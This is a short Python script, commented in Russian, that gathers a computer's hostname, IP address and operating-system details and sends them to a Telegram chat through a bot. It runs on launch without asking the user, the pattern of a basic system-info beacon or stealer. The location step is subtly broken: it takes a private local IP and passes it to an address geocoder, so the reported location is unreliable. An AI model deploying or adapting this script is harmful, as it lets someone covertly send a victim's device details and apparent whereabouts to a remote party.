import requests
import socket
import platform
import telebot
from geopy.geocoders import Nominatim

# Здесь нужно вставить токен вашего бота в Telegram
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'

# Создаем экземпляр бота
bot = telebot.TeleBot(TOKEN)

# Функция для получения IP-адреса устройства
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    s.close()
    return ip_address

# Функция для получения информации об устройстве
def get_device_info():
    device_info = {}

    device_info['hostname'] = socket.gethostname()
    device_info['ip_address'] = get_ip_address()
    device_info['system'] = platform.system()
    device_info['release'] = platform.release()
    device_info['version'] = platform.version()
    device_info['machine'] = platform.machine()

    return device_info

# Функция для получения местоположения по IP-адресу
def get_location(ip_address):
    geolocator = Nominatim(user_agent="geoapiExercises")
    location = geolocator.geocode(ip_address)
    if location:
        return location.address
    else:
        return "Местоположение не найдено"

# Функция для отправки сообщения в Telegram
def send_message(message):
    # Здесь нужно вставить ID вашего чата в Telegram, куда будет отправляться сообщение
    chat_id = 'YOUR_CHAT_ID'
    bot.send_message(chat_id, message)

# Получаем информацию об устройстве
device_info = get_device_info()

# Получаем местоположение по IP-адресу
ip_address = device_info['ip_address']
location = get_location(ip_address)

# Формируем сообщение с информацией об устройстве и местоположением
message = f"Hostname: {device_info['hostname']}\n"
message += f"IP Address: {device_info['ip_address']}\n"
message += f"Location: {location}\n"
message += f"System: {device_info['system']}\n"
message += f"Release: {device_info['release']}\n"
message += f"Version: {device_info['version']}\n"
message += f"Machine: {device_info['machine']}\n"
message += f"Google Maps: https://www.google.com/maps/search/?api=1&query={location.replace(' ', '+')}"

# Отправляем сообщение в Telegram
send_message(message)
